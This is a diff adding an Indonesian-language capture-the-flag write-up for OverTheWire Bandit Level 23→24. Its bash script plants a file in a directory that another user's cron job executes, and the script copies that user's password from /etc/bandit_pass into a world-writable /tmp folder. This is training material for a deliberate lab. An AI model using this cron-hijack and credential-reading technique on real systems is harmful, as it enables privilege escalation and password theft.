@@ -207,3 +207,49 @@ A program is running automatically at regular intervals from **`cron`**, the ti
     - **`echo I am user bandit23 | md5sum`**: Karena skrip asli menggunakan variabel `$myname`, kita menggantinya secara manual dengan `bandit23` untuk mengetahui "nama file rahasia" yang dihasilkan oleh sistem khusus untuk level berikutnya.
     - **`cut -d ' ' -f 1`**: Memotong hasil MD5 agar kita hanya mendapatkan string hash-nya saja tanpa karakter tambahan.
     - **`cat /tmp/8ca3...`**: Mengambil password yang sudah diletakkan di sana oleh tugas otomatis (cron) yang berjalan setiap menit.
+
+## Level 23 → Level 24
+
+### Level Goal
+
+A program is running automatically at regular intervals from **`cron`**, the time-based job scheduler. Look in **`/etc/cron.d/`** for the configuration and see what command is being executed.
+
+**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+### Commands you may need to solve this level
+
+`chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)`
+
+- Writeup
+    
+    Level ini mengajarkan cara mengeksploitasi **Cron Job** (tugas otomatis) yang berjalan dengan hak akses user lain. Kita akan membuat shell script sederhana agar user `bandit24` mengambilkan password untuk kita.
+    
+    ```bash
+    # Buat direktori kerja sementara di /tmp dan beri izin akses penuh
+    mkdir /tmp/solusi_bandit24
+    chmod 777 /tmp/solusi_bandit24
+    cd /tmp/solusi_bandit24
+    
+    # Buat script payload untuk mengambil password
+    echo '#!/bin/bash' > exploit.sh
+    echo 'cat /etc/bandit_pass/bandit24 > /tmp/solusi_bandit24/password.txt' >> exploit.sh
+    
+    # Beri izin eksekusi pada script agar bisa dijalankan oleh Cron
+    chmod 777 exploit.sh
+    
+    # Salin script ke direktori yang dipantau oleh cronjob bandit24
+    cp exploit.sh /var/spool/bandit24/foo/
+    
+    # Tunggu hingga 1 menit (karena cron berjalan setiap menit)
+    # Cek secara berkala sampai file password.txt muncul
+    ls -la
+    cat password.txt
+    ```
+    
+    - **`mkdir /tmp/solusi_bandit24`**: Membuat folder di area sementara karena kita tidak bisa menulis file di home directory.
+    - **`chmod 777`**: Memberikan izin **Read, Write, Execute** kepada semua user. Ini wajib agar user `bandit24` (yang menjalankan cron) bisa membaca script kita dan menulis hasilnya ke folder kita.
+    - **`#!/bin/bash`**: Baris *shebang* yang wajib ada agar sistem tahu bahwa ini adalah script shell.
+    - **`cat /etc/bandit_pass/bandit24 > ...`**: Isi perintah dalam script. Kita menyuruh user `bandit24` membaca password-nya sendiri dan menyimpannya ke file teks di folder kita.
+    - **`cp exploit.sh /var/spool/bandit24/foo/`**: Meletakkan script di folder "tugas" bandit24. Semua file di folder ini akan dijalankan otomatis lalu dihapus oleh sistem.
